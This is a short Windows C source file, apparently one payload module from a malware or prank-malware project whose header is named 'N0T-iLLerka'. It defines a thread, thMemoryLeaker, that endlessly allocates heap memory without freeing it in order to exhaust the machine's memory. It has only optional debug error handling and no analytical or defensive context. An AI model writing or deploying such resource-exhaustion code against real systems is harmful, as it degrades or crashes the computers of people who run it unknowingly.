#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

DWORD WINAPI thMemoryLeaker(LPVOID lpParam) {
	HANDLE hHeap = HeapCreate(NULL, 0, NULL);
	if (hHeap) {
		for (;;) {
			HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20);
			Sleep(1);
		}
	} else {
#ifdef DEBUG_MSG
		fnErrorHandlerW(L"Couldn't create Heap", NULL, L"HeapCreate", MB_OK | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}